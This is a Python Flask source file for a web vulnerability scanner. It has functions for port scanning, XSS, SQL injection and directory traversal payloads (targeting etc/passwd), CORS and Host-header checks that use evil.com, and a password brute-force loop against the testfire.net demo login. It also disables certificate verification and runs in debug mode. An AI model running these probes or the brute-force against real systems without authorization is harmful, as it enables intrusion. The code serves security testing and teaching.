from flask import Flask, request, jsonify, render_template, send_file
import requests
from fpdf import FPDF
import socket
import ssl
import re
from urllib.parse import urlparse
import os
import urllib3
from bs4 import BeautifulSoup

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# A list of XSS payloads for testing
xss_payloads = [
    "<script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "\"'><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>"
]

# A list of possible passwords for brute-force attack
password_list = ["password", "123456", "admin", "letmein", "test123"]

# Function to check open ports
def check_open_ports(url):
    hostname = urlparse(url).netloc
    common_ports = [80, 443, 22, 21, 3306, 8080, 1433, 3389, 5432, 27017]
    open_ports = []
    
    for port in common_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((hostname, port))
        if result == 0:
            open_ports.append(f"Port {port} is open on {hostname}")
        sock.close()
    return open_ports

# Function to check directory traversal vulnerabilities
def check_directory_traversal(url):
    payloads = ["../", "../../", "../../../", "..\\", "..\\..\\", "..\\..\\..\\"]
    sensitive_files = ["etc/passwd", "windows/win.ini", "boot.ini"]
    vulnerable = []
    
    for payload in payloads:
        for file in sensitive_files:
            try:
                response = requests.get(f"{url}{payload}{file}")
                if response.status_code == 200 and len(response.text) > 0:
                    vulnerable.append(f"Potential Directory Traversal found with payload: {payload}{file}")
            except:
                pass
    return vulnerable

# Function to check for CSRF vulnerabilities
def check_csrf(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        vulnerable = []
        
        for form in forms:
            if not form.find('input', {'name': re.compile('csrf', re.I)}):
                vulnerable.append(f"Potential CSRF vulnerability found in form: {form.get('action')}")
        return vulnerable
    except requests.ConnectionError:
        return ["Error: Could not connect to the server."]
    except requests.Timeout:
        return ["Error: The request timed out."]
    except Exception as e:
        return [f"Error occurred while checking for CSRF vulnerabilities: {e}"]

# Function to check SSL/TLS configuration
def check_ssl_tls(url):
    hostname = urlparse(url).netloc
    context = ssl.create_default_context()
    ssl_info = []
    
    try:
        with socket.create_connection((hostname, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as secure_sock:
                cert = secure_sock.getpeercert()
                
                ssl_info.append(f"SSL/TLS version: {cert.get('version', 'Unknown version')}")
                if 'notAfter' in cert:
                    ssl_info.append(f"Certificate expiration date: {cert['notAfter']}")
    except ssl.SSLError as e:
        ssl_info.append(f"SSL/TLS Error: {e}")
    except socket.gaierror:
        ssl_info.append("Error: Address-related error connecting to the server.")
    except socket.timeout:
        ssl_info.append("Error: Connection timed out.")
    except Exception as e:
        ssl_info.append(f"Error occurred while checking SSL/TLS configuration: {e}")
    
    return ssl_info

# Function to check Clickjacking vulnerability
def check_clickjacking(url):
    try:
        response = requests.get(url)
        headers = response.headers
        if 'X-Frame-Options' not in headers:
            return ["Potential Clickjacking vulnerability: X-Frame-Options header is missing"]
        return []
    except:
        return ["Error occurred while checking for Clickjacking vulnerability."]

# Function to check CORS misconfiguration
def check_cors_misconfiguration(url):
    try:
        headers = {'Origin': 'https://evil.com'}
        response = requests.get(url, headers=headers)
        if 'Access-Control-Allow-Origin' in response.headers:
            if response.headers['Access-Control-Allow-Origin'] == '*' or response.headers['Access-Control-Allow-Origin'] == 'https://evil.com':
                return ["Potential CORS misconfiguration found"]
        return []
    except:
        return ["Error occurred while checking for CORS misconfiguration."]

# Function to check Host Header Injection
def check_host_header_injection(url):
    try:
        headers = {'Host': 'evil.com'}
        response = requests.get(url, headers=headers, allow_redirects=False)
        if response.status_code == 302 and 'evil.com' in response.headers.get('Location', ''):
            return ["Potential Host Header Injection vulnerability found"]
        return []
    except requests.ConnectionError:
        return ["Error: Could not connect to the server."]
    except requests.Timeout:
        return ["Error: The request timed out."]
    except Exception as e:
        return [f"Error occurred while checking for Host Header Injection: {e}"]

# Function to check for SQL Injection
def check_sql_injection(url):
    payloads = ["' OR '1'='1", '" OR "1"="1']
    vulnerable = []
    
    for payload in payloads:
        try:
            response = requests.get(f"{url}?id={payload}")
            if response.status_code == 200 and "error" in response.text.lower():
                vulnerable.append(f"Potential SQL Injection found with payload: {payload}")
        except:
            pass
    return vulnerable

# Function to check for XSS
def check_xss(url):
    vulnerable = []
    
    for payload in xss_payloads:
        try:
            vulnerable_url = f"{url}?input={payload}"
            response = requests.get(vulnerable_url)
            if payload in response.text:
                vulnerable.append(payload)
        except:
            pass
    return vulnerable

# Function to perform brute-force login attempts
def login_to_altoro_mutual(login_url):
    # Start a session
    session = requests.Session()
    
    # Get the login page
    response = session.get(login_url, verify=False)
    
    # Parse the HTML
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Find the login form
    login_form = soup.find('form', {'name': 'login'})
    
    if not login_form:
        return "Login form not found."
    
    # Get the form action
    form_action = login_form.get('action', '')
    
    # Construct the full URL for form submission
    if form_action.startswith('/'):
        submit_url = f"https://testfire.net{form_action}"
    elif form_action.startswith('http'):
        submit_url = form_action
    else:
        submit_url = f"https://testfire.net/{form_action}"

    # Iterate over each password in the list
    for password in password_list:
        print(f"Trying password: '{password}'")
        
        # Prepare the login data
        login_data = {
            'uid': 'admin',
            'passw': password
        }
        
        # Submit the login form
        response = session.post(submit_url, data=login_data, verify=False)
        
        # Check if login was successful
        if "Welcome to Altoro Mutual Online." in response.text:
            return f"Password found: '{password}'"  # Return the matched password
            
    return "No password found."

# Route for the Home Page
@app.route("/", methods=["GET", "POST"])
def index():
    result = {}
    url = None

    if request.method == "POST":
        url = request.form["url"]

        # Determine which button was pressed and call the corresponding function
        if "open_ports" in request.form:
            result['open_ports'] = check_open_ports(url)
        elif "directory_traversal" in request.form:
            result['directory_traversal'] = check_directory_traversal(url)
        elif "csrf" in request.form:
            result['csrf'] = check_csrf(url)
        elif "ssl_tls" in request.form:
            result['ssl_tls'] = check_ssl_tls(url)
        elif "clickjacking" in request.form:
            result['clickjacking'] = check_clickjacking(url)
        elif "cors" in request.form:
            result['cors_misconfiguration'] = check_cors_misconfiguration(url)
        elif "host_header" in request.form:
            result['host_header_injection'] = check_host_header_injection(url)
        elif "sql_injection" in request.form:
            result['sql_injection'] = check_sql_injection(url)
        elif "xss" in request.form:
            result['xss'] = check_xss(url)
        elif "bruteforce" in request.form:
            found_password = login_to_altoro_mutual(url)
            result['bruteforce'] = found_password
        elif "all_checks" in request.form:
            result['open_ports'] = check_open_ports(url)
            result['directory_traversal'] = check_directory_traversal(url)
            result['csrf'] = check_csrf(url)
            result['ssl_tls'] = check_ssl_tls(url)
            result['clickjacking'] = check_clickjacking(url)
            result['cors_misconfiguration'] = check_cors_misconfiguration(url)
            result['host_header_injection'] = check_host_header_injection(url)
            result['sql_injection'] = check_sql_injection(url)
            result['xss'] = check_xss(url)

    return render_template("index.html", result=result, url=url)

# Route to generate a PDF report
@app.route('/download_pdf', methods=['POST'])
def download_pdf():
    data = request.json
    url = data.get('url')
    result = data.get('result')

    # Create a PDF document
    pdf = FPDF()
    pdf.add_page()

    # Title of the PDF
    pdf.set_font("Arial", 'B', 16)
    pdf.cell(200, 10, txt="Website Vulnerability Report", ln=True, align='C')
    pdf.ln(10)

    # Website URL
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt=f"Website URL: {url}", ln=True)
    pdf.ln(5)

    # Section Title for Vulnerable Payloads
    pdf.set_font("Arial", 'B', 12)
    pdf.cell(200, 10, txt="Vulnerable Payloads:", ln=True)
    pdf.ln(5)

    # Add vulnerable payloads to the PDF
    pdf.set_font("Arial", size=12)
    if "Not vulnerable" in result:
        pdf.multi_cell(200, 10, txt="No vulnerabilities found for XSS.")
    else:
        pdf.multi_cell(200, 10, txt="The following payloads were found vulnerable:")
        pdf.ln(5)

        # Add each found payload to the PDF
        for payload in result.get('xss', []):
            pdf.cell(200, 10, txt=f"Payload: {payload}", ln=True)

    # Save the PDF file
    pdf_filename = f"{url.replace('https://', '').replace('http://', '').replace('/', '_')}_vulnerability_report.pdf"
    pdf_output_path = os.path.join(os.getcwd(), pdf_filename)
    pdf.output(pdf_output_path)

    # Serve the file for download
    return send_file(pdf_output_path, as_attachment=True)

if __name__ == '__main__':
    app.run(debug=True)
